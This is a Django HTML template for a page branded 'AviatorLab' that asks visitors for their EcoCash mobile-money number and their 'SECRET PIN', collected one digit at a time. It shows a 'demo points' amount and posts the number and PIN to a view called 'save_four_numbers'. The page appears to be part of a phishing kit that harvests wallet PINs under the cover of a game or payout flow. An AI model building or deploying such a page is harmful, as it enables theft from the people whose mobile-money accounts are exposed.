{% extends "base.html" %}
{% block title %}PIN — AviatorLab{% endblock %}
{% block content %}
<div class="progress">
  <span class="done"></span><span class="done"></span><span class="active"></span><span></span>
</div>
<section class="narrow panel">
  <div class="eyebrow">PIN Details</div>
  <h1 class="page-title">EcoCash <span>Number &amp; SECRET PIN.</span></h1>
  <p class="muted">Enter your EcoCash number and your SECRET PIN.</p>
  <div class="summary"><span>Amount</span><b>{{ session.demo_points }}</b></div>

  <form method="post" action="{% url 'save_four_numbers' %}" id="numberForm">
    {% csrf_token %}

    <div class="input-wrap">
      <input id="phone" name="phone" type="tel" required placeholder="e.g. +47XXXXXXXX" autocomplete="tel">
    </div>

    <div class="number-grid four" style="margin-top:22px">

      {% for n in "1234" %}

      <label class="number-field">

        <input
          name="numbers"
          type="text"
          inputmode="numeric"
          pattern="[0-9]"
          maxlength="1"
          required
          placeholder=""
          autocomplete="off"
          aria-label="PIN digit"
        >

      </label>

      {% endfor %}

    </div>

    <button class="btn primary full">Click to Proceed <span>→</span></button>
  </form>
</section>
{% endblock %}
